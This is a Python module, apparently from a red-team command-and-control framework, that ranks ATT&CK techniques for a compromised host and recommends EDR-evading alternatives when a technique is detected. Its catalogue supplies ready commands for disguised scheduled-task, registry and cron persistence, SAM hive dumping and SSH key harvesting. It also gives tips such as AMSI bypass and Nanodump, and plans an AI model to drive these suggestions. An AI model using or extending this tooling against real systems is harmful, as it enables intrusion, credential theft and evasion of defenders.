"""
TTP Ranker — rule-based TTP suggestions and evasion advice.

Architecture:
  Phase 1 (current): Rule-based fallback — returns sensible suggestions based on
    OS, privilege level, detected defenses, and already-executed techniques.
  Phase 4 (planned): Fine-tuned Mistral-7B served via vllm, with RAG over
    the bundled ATT&CK STIX data. The interface stays the same.

The context schema determines what the team server must send, and also drives
the Postgres session state schema — do not change it without updating both.
"""

import json
from pathlib import Path
from typing import Optional

from pydantic import BaseModel, Field


# ---------------------------------------------------------------------------
# Context and output schemas — API contract between server and AI engine
# ---------------------------------------------------------------------------

class SessionContext(BaseModel):
    session_id:          str
    campaign_id:         str
    objective:           str
    os:                  str                  # "windows", "linux", "macos"
    is_elevated:         bool
    edr_detected:        list[str] = Field(default_factory=list)
    av_detected:         list[str] = Field(default_factory=list)
    running_processes:   list[str] = Field(default_factory=list)
    network_neighbors:   list[str] = Field(default_factory=list)
    executed_techniques: list[str] = Field(default_factory=list)


class TTPSuggestion(BaseModel):
    mitre_technique_id:   str
    mitre_technique_name: str
    tactic:               str
    rationale:            str
    detection_risk:       str            # "LOW" | "MEDIUM" | "HIGH" | "CRITICAL"
    confidence:           float          # 0.0–1.0
    prerequisites:        list[str] = Field(default_factory=list)
    suggested_task_type:  Optional[str] = None
    suggested_task_args:  Optional[dict] = None


# ---------------------------------------------------------------------------
# TTPRanker
# ---------------------------------------------------------------------------

class TTPRanker:
    def __init__(self, model_path: Optional[str] = None):
        self.model_path  = model_path
        self.model_name  = "rule-based-v1"
        self._attack_data: dict = {}

    async def load(self):
        stix_path = Path(__file__).parent.parent / "data" / "enterprise-attack.json"
        if stix_path.exists():
            with open(stix_path) as f:
                self._attack_data = json.load(f)

    async def suggest(self, context: SessionContext, max_count: int = 5) -> list[TTPSuggestion]:
        return self._rank_rules(context, max_count)

    async def suggest_evasion(
        self,
        failed_technique:    str,
        evasion_description: str,
        context:             SessionContext,
    ) -> tuple[list[TTPSuggestion], str]:
        alternatives = self._evasion_alternatives(failed_technique, context)
        edr_str = ", ".join(context.edr_detected) if context.edr_detected else "unknown EDR"
        explanation = (
            f"Technique {failed_technique} triggered a defensive response "
            f"({evasion_description}). "
            f"The following alternatives have lower detection probability "
            f"in environments with {edr_str}."
        )
        return alternatives, explanation

    # -----------------------------------------------------------------------
    # Rule-based ranking
    # -----------------------------------------------------------------------

    def _rank_rules(self, ctx: SessionContext, max_count: int) -> list[TTPSuggestion]:
        is_windows = ctx.os.lower() == "windows"
        is_linux   = ctx.os.lower() == "linux"
        high_edr   = any(
            e.lower() in ("crowdstrike", "sentinelone", "carbon black", "defender for endpoint")
            for e in ctx.edr_detected
        )
        already  = set(ctx.executed_techniques)
        pool     = _WINDOWS_PRIMARY if is_windows else (_LINUX_PRIMARY if is_linux else _WINDOWS_PRIMARY)
        results  = []

        for tid in pool:
            if tid in already:
                continue
            c = _ALL_TECHNIQUES.get(tid)
            if c is None:
                continue
            if c.get("requires_elevated") and not ctx.is_elevated:
                continue

            risk = c["base_risk"]
            if high_edr and c.get("edr_sensitive"):
                risk = _escalate_risk(risk)

            results.append(_make_suggestion(c, risk))

        _RISK_ORDER = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}
        results.sort(key=lambda s: (_RISK_ORDER[s.detection_risk], -s.confidence))
        return results[:max_count]

    def _evasion_alternatives(self, failed: str, ctx: SessionContext) -> list[TTPSuggestion]:
        alt_ids = _EVASION_MAP.get(failed, [])
        already = set(ctx.executed_techniques)
        results = []
        for tid in alt_ids:
            if tid in already:
                continue
            c = _ALL_TECHNIQUES.get(tid)
            if c is None:
                continue
            results.append(_make_suggestion(c, c["base_risk"], rationale_prefix=f"Alternative to {failed}: "))
        return results


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _escalate_risk(risk: str) -> str:
    order = ["LOW", "MEDIUM", "HIGH", "CRITICAL"]
    return order[min(order.index(risk) + 1, len(order) - 1)]


def _make_suggestion(c: dict, risk: str, rationale_prefix: str = "") -> TTPSuggestion:
    return TTPSuggestion(
        mitre_technique_id=c["id"],
        mitre_technique_name=c["name"],
        tactic=c["tactic"],
        rationale=rationale_prefix + c["rationale"],
        detection_risk=risk,
        confidence=c["confidence"],
        prerequisites=c.get("prerequisites", []),
        suggested_task_type=c.get("task_type"),
        suggested_task_args=c.get("task_args"),
    )


# ---------------------------------------------------------------------------
# Technique catalogue — indexed by ATT&CK ID for O(1) lookup
# ---------------------------------------------------------------------------

_ALL_TECHNIQUES: dict[str, dict] = {
    # ----- Execution -----------------------------------------------------------
    "T1059.001": {
        "id": "T1059.001", "name": "PowerShell", "tactic": "Execution",
        "base_risk": "MEDIUM", "confidence": 0.85, "edr_sensitive": True,
        "rationale": "Available on all Windows targets. Use -EncodedCommand and AMSI bypass.",
        "task_type": "shell",
        "task_args": {"cmd": "powershell -EncodedCommand <base64_payload>"},
    },
    "T1059.003": {
        "id": "T1059.003", "name": "Windows Command Shell", "tactic": "Execution",
        "base_risk": "LOW", "confidence": 0.90, "edr_sensitive": False,
        "rationale": "cmd.exe is ubiquitous and rarely flagged on its own.",
        "task_type": "shell",
        "task_args": {"cmd": "cmd /c <command>"},
    },
    "T1059.004": {
        "id": "T1059.004", "name": "Unix Shell", "tactic": "Execution",
        "base_risk": "LOW", "confidence": 0.95, "edr_sensitive": False,
        "rationale": "Primary execution primitive on Linux/macOS.",
        "task_type": "shell",
    },
    # ----- Persistence ---------------------------------------------------------
    "T1053.005": {
        "id": "T1053.005", "name": "Scheduled Task", "tactic": "Persistence",
        "base_risk": "LOW", "confidence": 0.90, "edr_sensitive": False,
        "rationale": "Scheduled tasks blend with legitimate admin activity.",
        "task_type": "shell",
        "task_args": {"cmd": "schtasks /create /tn \"WindowsUpdater\" /tr \"<payload>\" /sc onlogon /ru SYSTEM /f"},
    },
    "T1053.003": {
        "id": "T1053.003", "name": "Cron", "tactic": "Persistence",
        "base_risk": "LOW", "confidence": 0.92, "edr_sensitive": False,
        "rationale": "Cron jobs persist across reboots and are expected on Linux.",
        "task_type": "shell",
        "task_args": {"cmd": "(crontab -l; echo \"@reboot <payload>\") | crontab -"},
    },
    "T1112": {
        "id": "T1112", "name": "Modify Registry", "tactic": "Persistence",
        "base_risk": "LOW", "confidence": 0.88, "edr_sensitive": False,
        "rationale": "Run key modifications are low-visibility if using common paths.",
        "task_type": "shell",
        "task_args": {"cmd": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d \"<payload>\" /f"},
    },
    # ----- Credential Access ---------------------------------------------------
    "T1003.001": {
        "id": "T1003.001", "name": "LSASS Memory", "tactic": "Credential Access",
        "base_risk": "HIGH", "confidence": 0.70, "edr_sensitive": True,
        "requires_elevated": True,
        "rationale": "Dumps plaintext creds and hashes. Use Nanodump to avoid direct OpenProcess on lsass.",
        "prerequisites": ["elevated"],
    },
    "T1003.002": {
        "id": "T1003.002", "name": "SAM Database", "tactic": "Credential Access",
        "base_risk": "MEDIUM", "confidence": 0.75, "edr_sensitive": True,
        "requires_elevated": True,
        "rationale": "SAM dump via registry shadow copy avoids LSASS hooks.",
        "task_type": "shell",
        "task_args": {"cmd": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM sys.hive"},
        "prerequisites": ["elevated"],
    },
    "T1003.005": {
        "id": "T1003.005", "name": "LSA Secrets", "tactic": "Credential Access",
        "base_risk": "MEDIUM", "confidence": 0.72, "edr_sensitive": True,
        "requires_elevated": True,
        "rationale": "LSA Secrets stores service account creds and auto-logon passwords.",
        "prerequisites": ["elevated"],
    },
    "T1552.004": {
        "id": "T1552.004", "name": "Private Keys", "tactic": "Credential Access",
        "base_risk": "LOW", "confidence": 0.88, "edr_sensitive": False,
        "rationale": "SSH private keys allow lateral movement without passwords.",
        "task_type": "shell",
        "task_args": {"cmd": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"},
    },
    # ----- Defense Evasion -----------------------------------------------------
    "T1055.012": {
        "id": "T1055.012", "name": "Process Hollowing", "tactic": "Defense Evasion",
        "base_risk": "HIGH", "confidence": 0.65, "edr_sensitive": True,
        "rationale": "Hollow a legitimate process. Detected by memory scanning on modern EDRs.",
    },
    "T1055.001": {
        "id": "T1055.001", "name": "DLL Injection", "tactic": "Defense Evasion",
        "base_risk": "MEDIUM", "confidence": 0.72, "edr_sensitive": True,
        "rationale": "Inject a reflective DLL into a low-suspicion process.",
    },
    "T1134.001": {
        "id": "T1134.001", "name": "Token Impersonation", "tactic": "Defense Evasion",
        "base_risk": "MEDIUM", "confidence": 0.78, "edr_sensitive": False,
        "requires_elevated": True,
        "rationale": "Steal a token from a high-privilege process to blend in.",
        "prerequisites": ["elevated"],
    },
    "T1218.011": {
        "id": "T1218.011", "name": "Rundll32", "tactic": "Defense Evasion",
        "base_risk": "LOW", "confidence": 0.82, "edr_sensitive": False,
        "rationale": "Proxy execution via rundll32 avoids direct script-engine invocation.",
        "task_type": "shell",
        "task_args": {"cmd": "rundll32.exe <dll>,<export>"},
    },
    # ----- Discovery -----------------------------------------------------------
    "T1018": {
        "id": "T1018", "name": "Remote System Discovery", "tactic": "Discovery",
        "base_risk": "LOW", "confidence": 0.95, "edr_sensitive": False,
        "rationale": "Enumerate network neighbors before lateral movement.",
        "task_type": "shell",
        "task_args": {"cmd": "net view /all"},
    },
    # ----- Lateral Movement ----------------------------------------------------
    "T1021.002": {
        "id": "T1021.002", "name": "SMB / Admin Shares", "tactic": "Lateral Movement",
        "base_risk": "MEDIUM", "confidence": 0.80, "edr_sensitive": False,
        "rationale": "Lateral movement via admin shares. Requires valid creds or hashes.",
        "prerequisites": ["credentials"],
    },
    "T1021.003": {
        "id": "T1021.003", "name": "DCOM", "tactic": "Lateral Movement",
        "base_risk": "MEDIUM", "confidence": 0.74, "edr_sensitive": False,
        "rationale": "DCOM lateral movement generates less SMB traffic than PsExec-style.",
        "prerequisites": ["credentials"],
    },
    "T1021.006": {
        "id": "T1021.006", "name": "Windows Remote Management", "tactic": "Lateral Movement",
        "base_risk": "LOW", "confidence": 0.83, "edr_sensitive": False,
        "rationale": "WinRM is enabled by default on Windows Server; blends with admin traffic.",
        "prerequisites": ["credentials"],
    },
}

# Techniques surfaced during normal ranking (ordered — first = highest priority)
_WINDOWS_PRIMARY = [
    "T1018",       # Discovery first — understand the environment
    "T1059.003",   # Exec via cmd
    "T1059.001",   # PowerShell
    "T1053.005",   # Scheduled task persistence
    "T1112",       # Registry persistence
    "T1003.001",   # LSASS (elevated)
    "T1003.002",   # SAM fallback
    "T1021.006",   # WinRM lateral
    "T1021.002",   # SMB lateral
    "T1021.003",   # DCOM lateral
    "T1218.011",   # Rundll32 proxy exec
    "T1055.001",   # DLL inject
    "T1055.012",   # Process hollow (high risk)
    "T1134.001",   # Token steal (elevated)
]

_LINUX_PRIMARY = [
    "T1059.004",   # Shell exec
    "T1053.003",   # Cron
    "T1552.004",   # SSH keys
]

# Technique caught → lower-risk alternatives
_EVASION_MAP: dict[str, list[str]] = {
    "T1059.001": ["T1059.003", "T1218.011"],      # PS caught → cmd or rundll32
    "T1003.001": ["T1003.002", "T1003.005"],      # LSASS caught → SAM or LSA secrets
    "T1055.012": ["T1055.001", "T1134.001"],      # hollow caught → DLL inject or token
    "T1021.002": ["T1021.003", "T1021.006"],      # SMB caught → DCOM or WinRM
}
